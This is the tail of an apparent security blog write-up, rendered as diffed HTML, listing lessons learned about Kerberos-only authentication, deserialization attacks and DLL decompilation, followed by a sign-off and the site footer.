+<li>I learned about using pure kerberos authentication when NTLM is disabled (not to sure how useful this will be in real life but it was a fun exercise)</li>
+<li>I learned ALOT about deserialization  attacks.</li>
+<li>I learned more about deconstructing DLL&rsquo;s with DNSPy, that is fun.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Spent too long trying to use tools that utilize NTLM (netexec) for enumeration.</li>
+<li>See point 1, got caught out a few times.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        5680
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.135.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Oct 09 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.baf1622c95b2ed38ea638ca259c323d2a5537d258fb923994e97539b4c4ecf706c7992482768366adddcb83153dce8c33f5fc95a5c8abe6b2a03046892509fae.js"
+            integrity="sha512-uvFiLJWy7TjqY4yiWcMj0qVTfSWPuSOZTpdTm0xOz3BseZJIJ2g2at3cuDFT3OjDP1/JWlyKvmsqAwRoklCfrg=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
